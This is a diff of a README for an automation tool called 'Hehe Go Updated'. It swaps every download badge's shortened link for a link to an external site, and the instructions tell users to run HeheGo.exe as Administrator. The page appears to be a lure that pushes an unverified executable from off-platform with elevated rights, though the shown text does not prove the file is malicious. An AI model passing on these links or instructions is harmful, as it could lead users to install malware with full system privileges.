@@ -9,7 +9,7 @@ The **😄 Hehe Go Updated** is a lightweight automation utility designed for re
 
 <div align="center">
 
-[![Download Hehe Go Updated](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hehe-go-updated)
+[![Download Hehe Go Updated](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/hehe-go-updated)
 
 </div>
 
@@ -81,7 +81,7 @@ Repetitive computer tasks waste time. Clicking the same buttons. Typing the same
 3. **🖱️ Run as Administrator** — `HeheGo.exe`
 4. **🚀 Launch Hehe Go Updated**
 
-[![Download Hehe Go Updated](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hehe-go-updated)
+[![Download Hehe Go Updated](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/hehe-go-updated)
 
 ### Recording a Macro
 
@@ -168,7 +168,7 @@ Simple automation for everyday tasks. **Hehe Go Updated** helps you stop clickin
 
 <div align="center">
 
-[![Download Hehe Go Updated](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hehe-go-updated)
+[![Download Hehe Go Updated](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/hehe-go-updated)
 
 **Version 2.0.0** — Fun automation tool. Free forever.
 
